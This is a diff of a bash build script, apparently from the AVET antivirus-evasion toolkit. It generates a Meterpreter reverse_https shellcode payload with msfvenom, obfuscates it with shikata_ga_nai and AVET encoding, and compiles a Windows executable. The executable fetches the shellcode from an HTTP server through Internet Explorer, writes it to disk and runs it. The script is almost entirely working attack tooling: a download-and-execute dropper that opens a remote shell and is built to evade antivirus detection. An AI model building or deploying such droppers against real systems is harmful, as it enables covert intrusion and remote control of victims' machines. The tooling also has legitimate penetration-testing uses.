@@ -1,10 +1,22 @@
 #!/bin/bash        
-# example build script
+# Download the payload via internet explorer and execute.
+
+# The generated msf shellcode file needs to be hosted on a HTTP server.
+# Call the generated executable like:
+# output.exe http://myserver/scclean.txt
+# The executable will then download the shellcode file via internet explorer and drop the file on disk.
+# The shellcode is then read from the file and executed.
+
+# print AVET logo
+cat banner.txt
 
 # include script containing the compiler var $win32_compiler
 # you can edit the compiler in build/global_win32.sh
 # or enter $win32_compiler="mycompiler" here
 . build/global_win32.sh
+
+# import feature construction interface
+. build/feature_construction.sh
 
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
@@ -14,16 +26,39 @@ LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
 
 # make meterpreter reverse payload, encoded with shikata_ga_nai
-msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 2 -f c -a x86 --platform Windows > sc.txt
+msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 2 -f c -a x86 --platform Windows > input/sc_c.txt
 
-# format the shellcode for make_avet
-./format.sh sc.txt > scclean.txt && rm sc.txt
+# Apply AVET encoding
+encode_payload avet input/sc_c.txt output/scenc_raw.txt
 
-# call make_avet, compile 
-./make_avet -E -u 192.168.2.105/scclean.txt
-$win32_compiler -o pwn.exe avet.c
+# set shellcode source
+set_payload_source download_internet_explorer
+
+# set decoder and key source
+# AVET decoder requires no key
+set_decoder avet
+set_key_source none
+
+# set payload info source
+set_payload_info_source none
+
+# set shellcode binding technique
+set_payload_execution_method exec_shellcode
+
+# enable debug output
+enable_debug_print
+
+# compile 
+$win32_compiler -o output/output.exe source/avet.c
+strip output/output.exe
 
 # cleanup
-echo " " > defs.h
+cleanup_techniques
 
-# now copy scclean.txt to your web root and start 
+
+# The generated msf shellcode file needs to be hosted on a HTTP server.
+# Call the generated executable like:
+# output.exe http://myserver/scenc_raw.txt
+# The executable will then download the shellcode file via internet explorer and drop the file on disk.
+# The shellcode is then read from the file and executed.
+
